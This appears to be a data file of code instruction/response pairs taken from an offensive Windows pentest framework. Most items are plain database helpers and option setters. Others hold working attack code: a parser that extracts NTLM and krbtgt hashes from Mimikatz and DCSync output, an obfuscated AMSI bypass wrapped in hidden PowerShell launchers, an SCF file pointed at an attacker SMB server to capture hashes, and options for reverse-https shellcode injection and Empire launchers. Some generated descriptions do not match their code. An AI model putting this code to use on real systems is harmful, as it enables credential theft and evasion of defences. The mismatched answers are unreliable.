{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse the output from Invoke - Mimikatz to return credential sets.", "response": "def parse_mimikatz(self, data):\n        \"\"\"\n        Parse the output from Invoke-Mimikatz to return credential sets.\n\n        This was directly stolen from the Empire project as well.\n        \"\"\"\n\n        # cred format:\n        #   credType, domain, username, password, hostname, sid\n        creds = []\n\n        # regexes for \"sekurlsa::logonpasswords\" Mimikatz output\n        regexes = [\"(?s)(?<=msv :).*?(?=tspkg :)\", \"(?s)(?<=tspkg :).*?(?=wdigest :)\", \"(?s)(?<=wdigest :).*?(?=kerberos :)\", \"(?s)(?<=kerberos :).*?(?=ssp :)\", \"(?s)(?<=ssp :).*?(?=credman :)\", \"(?s)(?<=credman :).*?(?=Authentication Id :)\", \"(?s)(?<=credman :).*?(?=mimikatz)\"]\n\n        hostDomain = \"\"\n        domainSid = \"\"\n        hostName = \"\"\n\n        lines = data.split(\"\\n\")\n        for line in lines[0:2]:\n            if line.startswith(\"Hostname:\"):\n                try:\n                    domain = line.split(\":\")[1].strip()\n                    temp = domain.split(\"/\")[0].strip()\n                    domainSid = domain.split(\"/\")[1].strip()\n\n                    hostName = temp.split(\".\")[0]\n                    hostDomain = \".\".join(temp.split(\".\")[1:])\n                except:\n                    pass\n\n        for regex in regexes:\n\n            p = re.compile(regex)\n\n            for match in p.findall(data):\n\n                lines2 = match.split(\"\\n\")\n                username, domain, password = \"\", \"\", \"\"\n\n                for line in lines2:\n                    try:\n                        if \"Username\" in line:\n                            username = line.split(\":\",1)[1].strip()\n                        elif \"Domain\" in line:\n                            domain = line.split(\":\",1)[1].strip()\n                        elif \"NTLM\" in line or \"Password\" in line:\n                            password = line.split(\":\",1)[1].strip()\n                    except:\n                        pass\n\n                if username != \"\" and password != \"\" and password != \"(null)\":\n\n                    sid = \"\"\n\n                    # substitute the FQDN in if it matches\n                    if hostDomain.startswith(domain.lower()):\n                        domain = hostDomain\n                        sid = domainSid\n\n                    if validate_ntlm(password):\n                        credType = \"hash\"\n\n                    else:\n                        credType = \"plaintext\"\n\n                    # ignore machine account plaintexts\n                    if not (credType == \"plaintext\" and username.endswith(\"$\")):\n                        creds.append((credType, domain, username, password, hostName, sid))\n\n        if len(creds) == 0:\n            # check if we have lsadump output to check for krbtgt\n            #   happens on domain controller hashdumps\n            for x in xrange(8,13):\n                if lines[x].startswith(\"Domain :\"):\n\n                    domain, sid, krbtgtHash = \"\", \"\", \"\"\n\n                    try:\n                        domainParts = lines[x].split(\":\")[1]\n                        domain = domainParts.split(\"/\")[0].strip()\n                        sid = domainParts.split(\"/\")[1].strip()\n\n                        # substitute the FQDN in if it matches\n                        if hostDomain.startswith(domain.lower()):\n                            domain = hostDomain\n                            sid = domainSid\n\n                        for x in xrange(0, len(lines)):\n                            if lines[x].startswith(\"User : krbtgt\"):\n                                krbtgtHash = lines[x+2].split(\":\")[1].strip()\n                                break\n\n                        if krbtgtHash != \"\":\n                            creds.append((\"hash\", domain, \"krbtgt\", krbtgtHash, hostName, sid))\n                    except Exception as e:\n                        pass\n\n        if len(creds) == 0:\n            # check if we get lsadump::dcsync output\n            if '** SAM ACCOUNT **' in lines:\n                domain, user, userHash, dcName, sid = \"\", \"\", \"\", \"\", \"\"\n                for line in lines:\n                    try:\n                        if line.strip().endswith(\"will be the domain\"):\n                            domain = line.split(\"'\")[1]\n                        elif line.strip().endswith(\"will be the DC server\"):\n                            dcName = line.split(\"'\")[1].split(\".\")[0]\n                        elif line.strip().startswith(\"SAM Username\"):\n                            user = line.split(\":\")[1].strip()\n                        elif line.strip().startswith(\"Object Security ID\"):\n                            parts = line.split(\":\")[1].strip().split(\"-\")\n                            sid = \"-\".join(parts[0:-1])\n                        elif line.strip().startswith(\"Hash NTLM:\"):\n                            userHash = line.split(\":\")[1].strip()\n                    except:\n                        pass\n\n                if domain != \"\" and userHash != \"\":\n                    creds.append((\"hash\", domain, user, userHash, dcName, sid))\n\n        return self.uniquify_tuples(creds)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset the options for the VNC connection.", "response": "def options(self, context, module_options):\n        '''\n        CONTYPE   Specifies the VNC connection type, choices are: reverse, bind (default: reverse).\n        PORT      VNC Port (default: 5900)\n        PASSWORD  Specifies the connection password.\n        '''\n\n        self.contype = 'reverse'\n        self.port = 5900\n        self.password = None\n\n        if 'PASSWORD' not in module_options:\n            context.log.error('PASSWORD option is required!')\n            exit(1)\n\n        if 'CONTYPE' in module_options:\n            self.contype    =  module_options['CONTYPE']\n\n        if 'PORT' in module_options:\n            self.port = int(module_options['PORT'])\n\n        self.password = module_options['PASSWORD']\n\n        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')\n        self.ps_script2 = obfs_ps_script('invoke-vnc/Invoke-Vnc.ps1')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef add_computer(self, ip, hostname, domain, os, dc=None):\n        domain = domain.split('.')[0].upper()\n        cur = self.conn.cursor()\n\n        cur.execute('SELECT * FROM computers WHERE ip LIKE ?', [ip])\n        results = cur.fetchall()\n\n        if not len(results):\n            cur.execute(\"INSERT INTO computers (ip, hostname, domain, os, dc) VALUES (?,?,?,?,?)\", [ip, hostname, domain, os, dc])\n        else:\n            for host in results:\n                if (hostname != host[2]) or (domain != host[3]) or (os != host[4]):\n                    cur.execute(\"UPDATE computers SET hostname=?, domain=?, os=? WHERE id=?\", [hostname, domain, os, host[0]])\n                if dc != None and (dc != host[5]):\n                    cur.execute(\"UPDATE computers SET dc=? WHERE id=?\", [dc, host[0]])\n\n        cur.close()\n\n        return cur.lastrowid", "response": "Add a computer to the database."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef add_credential(self, credtype, domain, username, password, groupid=None, pillaged_from=None):\n        domain = domain.split('.')[0].upper()\n        user_rowid = None\n        cur = self.conn.cursor()\n\n        if groupid and not self.is_group_valid(groupid):\n            cur.close()\n            return\n\n        if pillaged_from and not self.is_computer_valid(pillaged_from):\n            cur.close()\n            return\n\n        cur.execute(\"SELECT * FROM users WHERE LOWER(domain)=LOWER(?) AND LOWER(username)=LOWER(?) AND LOWER(credtype)=LOWER(?)\", [domain, username, credtype])\n        results = cur.fetchall()\n\n        if not len(results):\n            cur.execute(\"INSERT INTO users (domain, username, password, credtype, pillaged_from_computerid) VALUES (?,?,?,?,?)\", [domain, username, password, credtype, pillaged_from])\n            user_rowid = cur.lastrowid\n            if groupid:\n                cur.execute(\"INSERT INTO group_relations (userid, groupid) VALUES (?,?)\", [user_rowid, groupid])\n        else:\n            for user in results:\n                if not user[3] and not user[4] and not user[5]:\n                    cur.execute('UPDATE users SET password=?, credtype=?, pillaged_from_computerid=? WHERE id=?', [password, credtype, pillaged_from, user[0]])\n                    user_rowid = cur.lastrowid\n                    if groupid and not len(self.get_group_relations(user_rowid, groupid)):\n                        cur.execute(\"INSERT INTO group_relations (userid, groupid) VALUES (?,?)\", [user_rowid, groupid])\n\n        cur.close()\n\n        logging.debug('add_credential(credtype={}, domain={}, username={}, password={}, groupid={}, pillaged_from={}) => {}'.format(credtype, domain, username, password,\n                                                                                                                                    groupid, pillaged_from, user_rowid))\n\n        return user_rowid", "response": "Add a credential to the database."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if this User ID is valid.", "response": "def is_user_valid(self, userID):\n        \"\"\"\n        Check if this User ID is valid.\n        \"\"\"\n        cur = self.conn.cursor()\n        cur.execute('SELECT * FROM users WHERE id=? LIMIT 1', [userID])\n        results = cur.fetchall()\n        cur.close()\n        return len(results) > 0"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn hosts from the database.", "response": "def get_computers(self, filterTerm=None, domain=None):\n        \"\"\"\n        Return hosts from the database.\n        \"\"\"\n\n        cur = self.conn.cursor()\n\n        # if we're returning a single host by ID\n        if self.is_computer_valid(filterTerm):\n            cur.execute(\"SELECT * FROM computers WHERE id=? LIMIT 1\", [filterTerm])\n\n        # if we're filtering by domain controllers\n        elif filterTerm == 'dc':\n            if domain:\n                cur.execute(\"SELECT * FROM computers WHERE dc=1 AND LOWER(domain)=LOWER(?)\", [domain])\n            else:\n                cur.execute(\"SELECT * FROM computers WHERE dc=1\")\n\n        # if we're filtering by ip/hostname\n        elif filterTerm and filterTerm != \"\":\n            cur.execute(\"SELECT * FROM computers WHERE ip LIKE ? OR LOWER(hostname) LIKE LOWER(?)\", ['%{}%'.format(filterTerm), '%{}%'.format(filterTerm)])\n\n        # otherwise return all computers\n        else:\n            cur.execute(\"SELECT * FROM computers\")\n\n        results = cur.fetchall()\n        cur.close()\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_group_valid(self, groupID):\n        cur = self.conn.cursor()\n        cur.execute('SELECT * FROM groups WHERE id=? LIMIT 1', [groupID])\n        results = cur.fetchall()\n        cur.close()\n\n        logging.debug('is_group_valid(groupID={}) => {}'.format(groupID, True if len(results) else False))\n        return len(results) > 0", "response": "Check if this group ID is valid."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting groups from the database.", "response": "def get_groups(self, filterTerm=None, groupName=None, groupDomain=None):\n        \"\"\"\n        Return groups from the database\n        \"\"\"\n        if groupDomain:\n            groupDomain = groupDomain.split('.')[0].upper()\n\n        cur = self.conn.cursor()\n\n        if self.is_group_valid(filterTerm):\n            cur.execute(\"SELECT * FROM groups WHERE id=? LIMIT 1\", [filterTerm])\n\n        elif groupName and groupDomain:\n            cur.execute(\"SELECT * FROM groups WHERE LOWER(name)=LOWER(?) AND LOWER(domain)=LOWER(?)\", [groupName, groupDomain])\n\n        elif filterTerm and filterTerm !=\"\":\n            cur.execute(\"SELECT * FROM groups WHERE LOWER(name) LIKE LOWER(?)\", ['%{}%'.format(filterTerm)])\n\n        else:\n            cur.execute(\"SELECT * FROM groups\")\n\n        results = cur.fetchall()\n        cur.close()\n        logging.debug('get_groups(filterTerm={}, groupName={}, groupDomain={}) => {}'.format(filterTerm, groupName, groupDomain, results))\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_credential(self, url, username, password):\n        cur = self.conn.cursor()\n\n        cur.execute(\"SELECT * FROM credentials WHERE LOWER(username)=LOWER(?) AND password=?\", [url, username, password])\n        results = cur.fetchall()\n\n        if not len(results):\n            cur.execute(\"INSERT INTO credentials (username, password) VALUES (?,?)\", [username, password] )\n\n        cur.close()", "response": "Add a credential to the database."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_credential_valid(self, credentialID):\n        cur = self.conn.cursor()\n        cur.execute('SELECT * FROM credentials WHERE id=? LIMIT 1', [credentialID])\n        results = cur.fetchall()\n        cur.close()\n        return len(results) > 0", "response": "Check if this credential ID is valid."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck if this credential ID is valid.", "response": "def is_host_valid(self, hostID):\n        \"\"\"\n        Check if this credential ID is valid.\n        \"\"\"\n        cur = self.conn.cursor()\n        cur.execute('SELECT * FROM host WHERE id=? LIMIT 1', [hostID])\n        results = cur.fetchall()\n        cur.close()\n        return len(results) > 0"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the credentials from the database.", "response": "def get_credentials(self, filterTerm=None):\n        \"\"\"\n        Return credentials from the database.\n        \"\"\"\n\n        cur = self.conn.cursor()\n\n        # if we're returning a single credential by ID\n        if self.is_credential_valid(filterTerm):\n            cur.execute(\"SELECT * FROM credentials WHERE id=? LIMIT 1\", [filterTerm])\n\n        # if we're filtering by username\n        elif filterTerm and filterTerm != \"\":\n            cur.execute(\"SELECT * FROM credentials WHERE LOWER(username) LIKE LOWER(?)\", ['%{}%'.format(filterTerm.lower())])\n\n        # otherwise return all credentials\n        else:\n            cur.execute(\"SELECT * FROM credentials\")\n\n        results = cur.fetchall()\n        cur.close()\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef options(self, context, module_options):\n        '''\n        THOROUGH   Searches entire filesystem for certain file extensions (default: False)\n        ALLDOMAIN  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them (default: False)\n        '''\n\n        self.thorough   = False\n        self.all_domain = False\n\n        if 'THOROUGH' in module_options:\n            self.thorough = bool(module_options['THOROUGH'])\n\n        if 'ALLDOMAIN' in module_options:\n            self.all_domain = bool(module_options['ALLDOMAIN'])\n\n        self.ps_script2 = obfs_ps_script('sessiongopher/SessionGopher.ps1')", "response": "Sets the options for the SessionGopher module"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset options for the powerview module", "response": "def  options(self, context, module_options):\n        '''\n            INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)\n        '''\n\n        self.exec_methods = ['smbexec', 'atexec']\n        self.inject = True\n        if 'INJECT' in module_options:\n            self.inject = bool(module_options['INJECT'])\n\n        if self.inject: self.exec_methods = None\n        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')\n        self.ps_script2 = obfs_ps_script('powersploit/Recon/PowerView.ps1')"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef options(self, context, module_options):\n        '''\n        THREADS             Max numbers of threads to execute on target (defaults to 20)\n        COLLECTIONMETHOD    Method used by BloodHound ingestor to collect data (defaults to 'Default')\n        CSVPATH             (optional) Path where csv files will be written on target (defaults to C:\\)\n        NEO4JURI            (optional) URI for direct Neo4j ingestion (defaults to blank)\n        NEO4JUSER           (optional) Username for direct Neo4j ingestion\n        NEO4JPASS           (optional) Pass for direct Neo4j ingestion\n\n        Give NEO4J options to perform direct Neo4j ingestion (no CSVs on target)\n        '''\n\n        self.threads = 3\n        self.csv_path = 'C:\\\\'\n        self.collection_method = 'Default'\n        self.neo4j_URI = \"\"\n        self.neo4j_user = \"\"\n        self.neo4j_pass = \"\"\n\n        if module_options and 'THREADS' in module_options:\n            self.threads = module_options['THREADS']\n        if module_options and 'CSVPATH' in module_options:\n            self.csv_path = module_options['CSVPATH']\n        if module_options and 'COLLECTIONMETHOD' in module_options:\n            self.collection_method = module_options['COLLECTIONMETHOD']\n        if module_options and 'NEO4JURI' in module_options:\n            self.neo4j_URI = module_options['NEO4JURI']\n        if module_options and 'NEO4JUSER' in module_options:\n            self.neo4j_user = module_options['NEO4JUSER']\n        if module_options and 'NEO4JPASS' in module_options:\n            self.neo4j_pass = module_options['NEO4JPASS']\n\n        if self.neo4j_URI != \"\" and self.neo4j_user != \"\" and self.neo4j_pass != \"\" :\n            self.opsec_safe= True\n\n        self.ps_script = obfs_ps_script('BloodHound-modified.ps1')", "response": "This method is called by the NEO4J module when the module is loaded."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_ouput(self, data, context, response):\n        '''\n        Parse the output from Invoke-BloodHound\n        '''\n\n        parsedData = data.split(\"!-!\")\n        nameList = ['user_sessions', 'group_membership.csv', 'acls.csv', 'local_admins.csv', 'trusts.csv']\n        for x in range(0, len(parsedData)):\n            if \"ComputerName\" in parsedData[x] and \"UserName\" in parsedData[x] :\n                log_name = '{}-{}-{}.csv'.format(nameList[0], response.client_address[0], datetime.now().strftime(\"%Y-%m-%d_%H%M%S\"))\n                write_log(parsedData[x].replace('\" \"', '\"\\n\"').replace(' \"', '\"'), log_name)\n                context.log.info(\"Saved csv output to {}\".format(log_name))\n            elif \"GroupName\" in parsedData[x] and \"AccountName\" in parsedData[x] :\n                log_name = '{}-{}-{}.csv'.format(nameList[1], response.client_address[0], datetime.now().strftime(\"%Y-%m-%d_%H%M%S\"))\n                write_log(parsedData[x].replace('\" \"', '\"\\n\"').replace(' \"', '\"'), log_name)\n                context.log.info(\"Saved csv output to {}\".format(log_name))\n            elif \"ComputerName\" in parsedData[x] and \"AccountName\" in parsedData[x] :\n                log_name = '{}-{}-{}.csv'.format(nameList[3], response.client_address[0], datetime.now().strftime(\"%Y-%m-%d_%H%M%S\"))\n                write_log(parsedData[x].replace('\" \"', '\"\\n\"').replace(' \"', '\"'), log_name)\n                context.log.info(\"Saved csv output to {}\".format(log_name))\n            elif \"SourceDomain\" in parsedData[x] and \"TrustType\" in parsedData[x] :\n                log_name = '{}-{}-{}.csv'.format(nameList[4], response.client_address[0], datetime.now().strftime(\"%Y-%m-%d_%H%M%S\"))\n                write_log(parsedData[x].replace('\" \"', '\"\\n\"').replace(' \"', '\"'), log_name)\n                context.log.info(\"Saved csv output to {}\".format(log_name))\n            elif \"ObjectName\" in parsedData[x] and \"ObjectType\" in parsedData[x] :\n                log_name = '{}-{}-{}.csv'.format(nameList[2], response.client_address[0], datetime.now().strftime(\"%Y-%m-%d_%H%M%S\"))\n                write_log(parsedData[x].replace('\" \"', '\"\\n\"').replace(' \"', '\"'), log_name)\n                context.log.info(\"Saved csv output to {}\".format(log_name))", "response": "Parse the output from Invoke - BloodHound and store it in the cache."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset the action of the current instance based on the module options.", "response": "def options(self, context, module_options):\n        '''\n            ACTION  Enable/Disable RDP (choices: enable, disable)\n        '''\n\n        if not 'ACTION' in module_options:\n            context.log.error('ACTION option not specified!')\n            exit(1)\n\n        if module_options['ACTION'].lower() not in ['enable', 'disable']:\n            context.log.error('Invalid value for ACTION option!')\n            exit(1)\n\n        self.action = module_options['ACTION'].lower()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef options(self, context, module_options):\n        '''\n            LISTENER    Listener name to generate the launcher for\n        '''\n\n        if not 'LISTENER' in module_options:\n            context.log.error('LISTENER option is required!')\n            sys.exit(1)\n\n        self.empire_launcher = None\n\n        headers = {'Content-Type': 'application/json'}\n        #Pull the host and port from the config file\n        base_url = 'https://{}:{}'.format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))\n\n        try:\n            #Pull the username and password from the config file\n            payload = {'username': context.conf.get('Empire', 'username'),\n                       'password': context.conf.get('Empire', 'password')}\n\n            r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)\n            if r.status_code == 200:\n                token = r.json()['token']\n            else:\n                context.log.error(\"Error authenticating to Empire's RESTful API server!\")\n                sys.exit(1)\n\n            payload = {'StagerName': 'multi/launcher', 'Listener': module_options['LISTENER']}\n            r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)\n            \n            response = r.json()\n            if \"error\" in response:\n                context.log.error(\"Error from empire : {}\".format(response[\"error\"]))\n                sys.exit(1)\n\n            self.empire_launcher = response['multi/launcher']['Output']\n\n            context.log.success(\"Successfully generated launcher for listener '{}'\".format(module_options['LISTENER']))\n\n        except ConnectionError as e:\n            context.log.error(\"Unable to connect to Empire's RESTful API: {}\".format(e))\n            sys.exit(1)", "response": "This method generates the launcher for a LISTENER    listener."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ninitializes the object properties.", "response": "def options(self, context, module_options):\n        '''\n            PATH     Path to dll/exe to inject\n            PROCID   Process ID to inject into (default: current powershell process)\n            EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)\n        '''\n\n        if not 'PATH' in module_options:\n            context.log.error('PATH option is required!')\n            exit(1)\n\n        self.payload_path = os.path.expanduser(module_options['PATH'])\n        if not os.path.exists(self.payload_path):\n            context.log.error('Invalid path to EXE/DLL!')\n            exit(1)\n\n        self.procid  = None\n        self.exeargs = None\n\n        if 'PROCID' in module_options:\n            self.procid = module_options['PROCID']\n\n        if 'EXEARGS' in module_options:\n            self.exeargs = module_options['EXEARGS']\n\n        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1')"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsets options for the current instance of the class.", "response": "def options(self, context, module_options):\n        '''\n            USER      Search for the specified username in available tokens (default: None)\n            USERFILE  File containing usernames to search for in available tokens (defult: None)\n        '''\n\n        self.user = None\n        self.userfile = None\n\n        if 'USER' in module_options and 'USERFILE' in module_options:\n            context.log.error('USER and USERFILE options are mutually exclusive!')\n            sys.exit(1)\n\n        if 'USER' in module_options:\n            self.user = module_options['USER']\n\n        elif 'USERFILE' in module_options:\n            path = os.path.expanduser(module_options['USERFILE'])\n\n            if not os.path.exists(path):\n                context.log.error('Path to USERFILE invalid!')\n                sys.exit(1)\n\n            self.userfile = path\n\n        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-TokenManipulation.ps1')"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef options(self, context, module_options):\n        '''\n            PATH     Path to the file containing raw shellcode to inject\n            PROCID   Process ID to inject into (default: current powershell process)\n        '''\n\n        if not 'PATH' in module_options:\n            context.log.error('PATH option is required!')\n            exit(1)\n\n        self.shellcode_path = os.path.expanduser(module_options['PATH'])\n        if not os.path.exists(self.shellcode_path):\n            context.log.error('Invalid path to shellcode!')\n            exit(1)\n\n        self.procid  = None\n\n        if 'PROCID' in module_options.keys():\n            self.procid = module_options['PROCID']\n\n        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')", "response": "Initialize the object properties."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nscript Script version to execute (choices: bash, python) (default: bash)", "response": "def options(self, context, module_options):\n        '''\n        SCRIPT  Script version to execute (choices: bash, python) (default: bash)\n        '''\n        scripts = {'PYTHON': get_script('mimipenguin/mimipenguin.py'),\n                   'BASH' : get_script('mimipenguin/mimipenguin.sh')}\n\n        self.script_choice = 'BASH'\n        if 'SCRIPT' in module_options:\n            self.script_choice = module_options['SCRIPT'].upper()\n            if self.script_choice not in scripts.keys():\n                context.log.error('SCRIPT option choices can only be PYTHON or BASH')\n                exit(1)\n\n        self.script = scripts[self.script_choice]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef which(cmd, mode=os.F_OK | os.X_OK, path=None):\n    # Check that a given file can be accessed with the correct mode.\n    # Additionally check that `file` is not a directory, as on Windows\n    # directories pass the os.access check.\n    def _access_check(fn, mode):\n        return (os.path.exists(fn) and os.access(fn, mode) and\n                not os.path.isdir(fn))\n\n    # If we're given a path with a directory part, look it up directly\n    # rather than referring to PATH directories. This includes checking\n    # relative to the current directory, e.g. ./script\n    if os.path.dirname(cmd):\n        if _access_check(cmd, mode):\n            return cmd\n        return None\n\n    if path is None:\n        path = os.environ.get(\"PATH\", os.defpath)\n    if not path:\n        return None\n    path = path.split(os.pathsep)\n\n    files = [cmd]\n\n    seen = set()\n    for dir in path:\n        normdir = os.path.normcase(dir)\n        if normdir not in seen:\n            seen.add(normdir)\n            for thefile in files:\n                name = os.path.join(dir, thefile)\n                if _access_check(name, mode):\n                    return name\n    return None", "response": "Given a command and a PATH string return the path which\n    conforms to the given mode on the PATH string or None if there is no such file."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting the domain options for the module.", "response": "def options(self, context, module_options):\n        '''\n        DOMAIN             Domain to enumerate DNS for. Defaults to all zones.\n        '''\n        self.domains = None\n        if module_options and 'DOMAIN' in module_options:\n            self.domains = module_options['DOMAIN']"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef options(self, context, module_options):\n        '''\n            LHOST    IP hosting the handler\n            LPORT    Handler port\n            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)\n            PROCID   Process ID to inject into (default: current powershell process)\n        '''\n\n        self.met_payload = 'reverse_https'\n        self.procid = None\n\n        if not 'LHOST' in module_options or not 'LPORT' in module_options:\n            context.log.error('LHOST and LPORT options are required!')\n            exit(1)\n\n        if 'PAYLOAD' in module_options:\n            self.met_payload = module_options['PAYLOAD']\n\n        if 'PROCID' in module_options:\n            self.procid = module_options['PROCID']\n\n        self.lhost = module_options['LHOST']\n        self.lport = module_options['LPORT']\n\n        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')", "response": "Set options for the powershell process."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a command that runs the given command on the current host.", "response": "def create_ps_command(ps_command, force_ps32=False, dont_obfs=False):\n\n    amsi_bypass = \"\"\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n\"\"\"\n\n    if force_ps32:\n        command = amsi_bypass + \"\"\"\n$functions = {{\n    function Command-ToExecute\n    {{\n{command}\n    }}\n}}\nif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')\n{{\n    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32\n    $job | Wait-Job\n}}\nelse\n{{\n    IEX \"$functions\"\n    Command-ToExecute\n}}\n\"\"\".format(command=amsi_bypass + ps_command)\n\n    else:\n        command = amsi_bypass + ps_command\n\n    logging.debug('Generated PS command:\\n {}\\n'.format(command))\n\n    # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed concurrently\n    # it would spawn a local powershell process per host which isn't ideal, until I figure out a good way of dealing with this \n    # it will use the partial python implementation that I stole from GreatSCT (https://github.com/GreatSCT/GreatSCT) <3\n\n    \"\"\"\n    if is_powershell_installed():\n\n        temp = tempfile.NamedTemporaryFile(prefix='cme_',\n                                           suffix='.ps1',\n                                           dir='/tmp')\n        temp.write(command)\n        temp.read()\n\n        encoding_types = [1,2,3,4,5,6]\n        while True:\n            encoding = random.choice(encoding_types)\n            invoke_obfs_command = 'powershell -C \\'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command \"ENCODING,{}\" -Quiet\\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),\n                                                                                                                                              temp.name,\n                                                                                                                                              encoding)\n            logging.debug(invoke_obfs_command)\n            out = check_output(invoke_obfs_command, shell=True).split('\\n')[4].strip()\n\n            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C \"{}\"'.format(out)\n            logging.debug('Command length: {}'.format(len(command)))\n\n            if len(command) <= 8192:\n                temp.close()\n                break\n\n            encoding_types.remove(encoding)\n    \n    else:\n    \"\"\"\n    if not dont_obfs:\n        obfs_attempts = 0\n        while True:\n            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C \"' + invoke_obfuscation(command) + '\"'\n            if len(command) <= 8191: \n                break\n\n            if obfs_attempts == 4:\n                logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))\n                exit(1)\n\n            obfs_attempts += 1\n    else:\n        command = 'powershell.exe -noni -nop -w 1 -enc {}'.format(encode_ps_command(command))\n        if len(command) > 8191:\n            logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))\n            exit(1)\n\n    return command"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef options(self, context, module_options):\n        '''\n        SERVER      IP of the SMB server\n        NAME        SCF file name\n        CLEANUP     Cleanup (choices: True or False)\n        '''\n\n        self.cleanup = False\n\n        if 'CLEANUP' in module_options:\n            self.cleanup = bool(module_options['CLEANUP'])\n\n        if 'NAME' not in module_options:\n             context.log.error('NAME option is required!')\n             exit(1)\n  \n        if not self.cleanup and 'SERVER' not in module_options:\n            context.log.error('SERVER option is required!')\n            exit(1)\n \n        self.scf_name = module_options['NAME']\n        self.scf_path = '/tmp/{}.scf'.format(self.scf_name)\n        self.file_path = ntpath.join('\\\\', '{}.scf'.format(self.scf_name))\n  \n        if not self.cleanup:\n            self.server = module_options['SERVER']\n            scuf = open(self.scf_path, 'a');\n            scuf.write(\"[Shell]\" + '\\n');\n            scuf.write(\"Command=2\" + '\\n');\n            scuf.write(\"IconFile=\" + '\\\\\\\\{}\\\\share\\\\icon.ico'.format(self.server) + '\\n');\n            scuf.close();", "response": "This function is called when the module is loaded from the command line."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef options(self, context, module_options):\n        '''\n        PROCESS   Process to hook, only x86 processes are supported by NetRipper currently (Choices: firefox, chrome, putty, winscp, outlook, lync)\n        '''\n\n        self.process = None\n\n        if 'PROCESS' in module_options:\n            self.process = module_options['PROCESS']\n        else:\n            context.log.error('PROCESS option is required')\n            exit(1)\n\n        self.share_name = gen_random_string(5).upper()\n        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')\n        self.ps_script2 = obfs_ps_script('netripper/PowerShell/Invoke-NetRipper.ps1')\n\n        context.log.info('This module will not exit until CTRL-C is pressed')\n        context.log.info('Logs will be stored in ~/.cme/logs\\n')\n\n        self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path)\n        self.smb_server.start()", "response": "Initialize the object with the options from the module."}
